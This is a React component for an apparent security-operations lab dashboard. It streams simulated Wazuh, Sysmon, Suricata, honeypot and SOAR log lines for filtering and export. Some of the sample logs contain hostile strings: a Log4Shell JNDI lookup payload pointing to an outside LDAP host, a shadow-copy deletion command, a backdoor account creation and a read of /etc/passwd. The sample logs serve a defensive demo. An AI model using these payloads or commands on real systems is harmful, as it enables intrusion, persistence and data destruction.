import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { motion } from 'framer-motion';
import {
  Terminal, Search, Play, Pause,
  Download, Filter, RefreshCw,
  Trash2, ChevronDown, Clock,
} from 'lucide-react';
import LogStream from './LogStream';

// ── Simulated log lines (realistic Wazuh / Suricata / sysmon) ─
const LOG_POOL = [
  { src:'wazuh',    text:'2024-01-15T10:23:44Z win10-victim wazuh[1]: Rule fired: 100013 level 15 "LSASS memory access — Mimikatz pattern" agent=win10-victim' },
  { src:'sysmon',   text:'2024-01-15T10:23:44Z win10-victim sysmon[1234]: EventID=10 TargetImage=lsass.exe SourceImage=powershell.exe GrantedAccess=0x1FFFFF' },
  { src:'sysmon',   text:'2024-01-15T10:23:46Z win10-victim sysmon[1234]: EventID=1 Image=net.exe CommandLine="net user backdooruser P@ss! /add" User=SYSTEM' },
  { src:'sysmon',   text:'2024-01-15T10:24:02Z win10-victim sysmon[1234]: EventID=1 Image=vssadmin.exe CommandLine="vssadmin.exe delete shadows /all /quiet"' },
  { src:'apache',   text:'2024-01-15T10:24:15Z ubuntu-web apache2[5678]: 198.51.100.99 - - "GET / HTTP/1.1" 200 - "${jndi:ldap://198.51.100.99:1389/a}"' },
  { src:'wazuh',    text:'2024-01-15T10:24:15Z ubuntu-web wazuh[1]: Rule fired: 100019 level 15 "Log4Shell JNDI payload detected" agent=ubuntu-webserver' },
  { src:'suricata', text:'2024-01-15T10:18:30Z suricata: [1:9000002:1] SOC-LAB SSH Brute Force Detected [Priority: 1] TCP 203.0.113.45:54321 -> 192.168.56.40:22' },
  { src:'sshd',     text:'2024-01-15T10:18:30Z ubuntu-web sshd[9012]: Failed password for root from 203.0.113.45 port 54321 ssh2' },
  { src:'sshd',     text:'2024-01-15T10:18:31Z ubuntu-web sshd[9012]: Failed password for admin from 203.0.113.45 port 54322 ssh2' },
  { src:'wazuh',    text:'2024-01-15T10:18:32Z ubuntu-web wazuh[1]: Rule fired: 100001 level 10 "SSH brute force — 10+ failures in 60s" src_ip=203.0.113.45' },
  { src:'cowrie',   text:'2024-01-15T09:45:01Z cowrie[1]: CowrieSSHTransport,0 Login attempt [root/password] succeeded on 192.168.56.10:2222' },
  { src:'cowrie',   text:'2024-01-15T09:45:03Z cowrie[1]: CMD: whoami — returned: root (honeypot)' },
  { src:'cowrie',   text:'2024-01-15T09:45:05Z cowrie[1]: CMD: cat /etc/passwd — honeypot response delivered' },
  { src:'wazuh',    text:'2024-01-15T09:45:05Z siem-server wazuh[1]: Rule fired: 100017 level 14 "Cowrie honeypot interaction" src_ip=198.51.100.23' },
  { src:'suricata', text:'2024-01-15T09:12:00Z suricata: [1:9000001:1] SOC-LAB Nmap SYN Scan Detected [Priority: 2] TCP 192.168.56.20:* -> 192.168.56.0/24:*' },
  { src:'thehive',  text:'2024-01-15T10:24:30Z auto_investigate: TheHive case CASE-2024-0047 created — P1 Critical — LSASS memory access' },
  { src:'thehive',  text:'2024-01-15T10:24:35Z auto_investigate: AbuseIPDB lookup 203.0.113.45 returned score=94% — marking malicious' },
  { src:'thehive',  text:'2024-01-15T10:24:40Z block_ip: iptables DROP rule added for 203.0.113.45 — success' },
  { src:'thehive',  text:'2024-01-15T10:24:41Z block_ip: pfSense WAN block rule created for 203.0.113.45 — success' },
  { src:'wazuh',    text:'2024-01-15T10:25:00Z win10-victim wazuh[1]: Agent status check — connected — 192.168.56.30 — version 4.7.4' },
  { src:'auth',     text:'2024-01-15T10:20:00Z siem-server pam_unix: sshd session opened for user analyst-chen by (uid=0)' },
  { src:'auth',     text:'2024-01-15T09:00:05Z siem-server pam_unix: sshd session opened for user admin-kim by (uid=0)' },
  { src:'wazuh',    text:'2024-01-15T08:30:00Z siem-server wazuh-manager: Started. Rules loaded: 3247 custom: 20 version: 4.7.4' },
  { src:'suricata', text:'2024-01-15T10:30:00Z suricata: Stats | flows: 1234 bytes: 8492034 alerts: 47 drops: 0' },
];

const SOURCE_OPTS = [
  { id:'all',      label:'All Sources',  color:'#00e5ff' },
  { id:'wazuh',    label:'Wazuh',        color:'#00e5ff' },
  { id:'sysmon',   label:'Sysmon',       color:'#ffd600' },
  { id:'suricata', label:'Suricata',     color:'#a855f7' },
  { id:'apache',   label:'Apache',       color:'#ff8c00' },
  { id:'sshd',     label:'SSHd',         color:'#6b7fa3' },
  { id:'cowrie',   label:'Cowrie',       color:'#ff2d6d' },
  { id:'thehive',  label:'TheHive/SOAR', color:'#00e5ff' },
  { id:'auth',     label:'Auth',         color:'#00ff88' },
];

let logId = 1;
function makeLog(src, text, ts) {
  return { id: logId++, src, text, ts: ts || new Date().toISOString().slice(11,19) };
}

export default function LiveLogExplorer() {
  const [logs,     setLogs]     = useState(() =>
    LOG_POOL.map(l => makeLog(l.src, l.text, l.text.slice(0,19)))
  );
  const [paused,   setPaused]   = useState(false);
  const [search,   setSearch]   = useState('');
  const [srcFilter,setSrcFilter]= useState('all');
  const [rate,     setRate]     = useState(2500);   // ms between synthetic logs
  const [count,    setCount]    = useState(0);

  // ── Simulate incoming logs ─────────────────────────────
  useEffect(() => {
    if (paused) return;
    const timer = setInterval(() => {
      const template = LOG_POOL[Math.floor(Math.random() * LOG_POOL.length)];
      const newLog   = makeLog(
        template.src,
        template.text.replace(/T\d{2}:\d{2}:\d{2}Z/, `T${new Date().toISOString().slice(11,19)}Z`),
        new Date().toISOString().slice(11,19),
      );
      setLogs(prev => [...prev, newLog].slice(-2000));
      setCount(c => c + 1);
    }, rate);
    return () => clearInterval(timer);
  }, [paused, rate]);

  // ── Filter ────────────────────────────────────────────
  const filtered = useMemo(() => {
    const q = search.toLowerCase().trim();
    return logs.filter(l => {
      if (srcFilter !== 'all' && l.src !== srcFilter) return false;
      if (q && !l.text.toLowerCase().includes(q)) return false;
      return true;
    });
  }, [logs, search, srcFilter]);

  const clearLogs = () => { setLogs([]); setCount(0); };

  const exportLogs = () => {
    const blob = new Blob([filtered.map(l => l.text).join('\n')], { type:'text/plain' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = `soc_logs_${Date.now()}.txt`;
    a.click(); URL.revokeObjectURL(url);
  };

  // Src stats
  const srcCounts = useMemo(() => {
    const counts = {};
    logs.forEach(l => { counts[l.src] = (counts[l.src]||0)+1; });
    return counts;
  }, [logs]);

  return (
    <motion.div
      key="live-log"
      initial={{ opacity:0, y:10 }}
      animate={{ opacity:1, y:0 }}
      transition={{ duration:0.25 }}
    >
      {/* Header */}
      <div style={{ marginBottom:20 }}>
        <h1 style={{
          fontSize:22, fontWeight:700, color:'#e8f4ff',
          margin:0, display:'flex', alignItems:'center', gap:10,
        }}>
          <Terminal size={20} color="#00e5ff" />
          Live Log Explorer
          {!paused && (
            <motion.div
              animate={{ opacity:[1,0.3,1] }}
              transition={{ duration:1.2, repeat:Infinity }}
              style={{
                width:8, height:8, borderRadius:'50%',
                background:'#ff2d6d',
                boxShadow:'0 0 8px rgba(255,45,109,0.7)',
              }}
            />
          )}
        </h1>
        <div style={{ fontSize:13, color:'#3d5080', marginTop:4 }}>
          Real-time log stream · {logs.length.toLocaleString()} events buffered
          · {filtered.length.toLocaleString()} visible
        </div>
      </div>

      {/* Source stats */}
      <div style={{ display:'flex', gap:8, marginBottom:14, flexWrap:'wrap' }}>
        {SOURCE_OPTS.filter(s => s.id !== 'all').map(src => (
          <div key={src.id} style={{
            display:'flex', alignItems:'center', gap:6,
            padding:'5px 10px',
            background:srcFilter===src.id?`${src.color}14`:'rgba(0,0,0,0.2)',
            border:`1px solid ${srcFilter===src.id?src.color+'30':'#1a2744'}`,
            borderRadius:7, cursor:'pointer', transition:'all 0.14s',
          }} onClick={() => setSrcFilter(srcFilter===src.id?'all':src.id)}>
            <div style={{
              width:6, height:6, borderRadius:'50%', background:src.color, flexShrink:0,
            }} />
            <span style={{ fontSize:11, color:srcFilter===src.id?src.color:'#6b7fa3' }}>
              {src.label}
            </span>
            <span style={{
              fontFamily:'JetBrains Mono,monospace', fontSize:10.5,
              color:src.color, fontWeight:600,
            }}>
              {srcCounts[src.id]||0}
            </span>
          </div>
        ))}
      </div>

      {/* Controls */}
      <div style={{
        display:'flex', gap:8, marginBottom:10,
        flexWrap:'wrap', alignItems:'center',
      }}>
        {/* Search */}
        <div style={{ position:'relative', flex:1, minWidth:200 }}>
          <Search size={12} color="#4a6090" style={{
            position:'absolute', left:9, top:'50%', transform:'translateY(-50%)',
          }} />
          <input className="soc-input" value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Filter log lines… (highlighted in stream)"
            style={{ paddingLeft:28, height:30, fontSize:12 }}
          />
        </div>

        {/* Rate */}
        <div style={{ display:'flex', alignItems:'center', gap:8, fontSize:12 }}>
          <Clock size={13} color="#3d5080" />
          <span style={{ color:'#6b7fa3' }}>Rate:</span>
          {[5000,2500,1000,500].map(r => (
            <button key={r} onClick={() => setRate(r)} style={{
              padding:'3px 9px', borderRadius:6, fontSize:11,
              cursor:'pointer', border:'1px solid',
              background:rate===r?'rgba(0,229,255,0.14)':'rgba(255,255,255,0.04)',
              color:      rate===r?'#00e5ff':'#6b7fa3',
              borderColor:rate===r?'rgba(0,229,255,0.30)':'#1a2744',
              fontFamily:'JetBrains Mono,monospace',
            }}>{r>=1000?`${r/1000}s`:`${r}ms`}</button>
          ))}
        </div>

        <button
          className="btn-cyber"
          onClick={() => setPaused(p => !p)}
          style={{
            padding:'6px 14px', fontSize:12.5,
            background:paused?'rgba(0,229,255,0.14)':'rgba(255,45,109,0.12)',
            color:      paused?'#00e5ff':'#ff2d6d',
            border:`1px solid ${paused?'rgba(0,229,255,0.30)':'rgba(255,45,109,0.28)'}`,
          }}>
          {paused ? <Play size={13}/> : <Pause size={13}/>}
          {paused ? 'Resume' : 'Pause'}
        </button>

        <button className="btn-cyber btn-ghost"
          style={{ fontSize:12, padding:'6px 12px' }}
          onClick={clearLogs}>
          <Trash2 size={13}/>
        </button>

        <button className="btn-cyber btn-ghost"
          style={{ fontSize:12, padding:'6px 12px' }}
          onClick={exportLogs}>
          <Download size={13}/> Export
        </button>
      </div>

      {/* Log stream */}
      <LogStream
        logs={filtered}
        highlight={search}
        paused={paused}
        maxVisible={300}
      />

      {/* Footer */}
      <div style={{
        display:'flex', justifyContent:'space-between',
        alignItems:'center', marginTop:8,
        fontSize:11.5, color:'#3d5080',
        fontFamily:'JetBrains Mono,monospace',
      }}>
        <span>
          Buffer: {logs.length.toLocaleString()} / 2,000 events
        </span>
        <span>
          {paused
            ? '⏸ PAUSED'
            : `▶ LIVE — ${count} events ingested`
          }
        </span>
        <span>
          Showing {filtered.length.toLocaleString()} matched lines
        </span>
      </div>
    </motion.div>
  );
}